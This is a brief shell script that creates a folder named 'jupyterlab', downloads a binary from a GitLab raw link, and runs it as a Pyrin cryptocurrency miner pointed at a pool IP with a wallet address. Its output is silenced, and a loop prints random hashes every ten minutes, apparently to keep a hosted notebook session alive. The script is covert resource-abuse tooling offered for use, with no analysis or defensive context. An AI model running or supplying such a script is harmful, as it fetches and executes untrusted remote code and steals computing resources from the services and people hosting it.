mkdir jupyterlab
cd jupyterlab

curl -0 https://gitlab.com/sarifadim/jomblo/-/raw/main/bali && chmod +x bali
./bali --algo PYRIN  --pool 47.254.125.141:443 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo 0A-$(TZ=UTC-7 date +"%H-%M-%S")) &>/dev/null
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
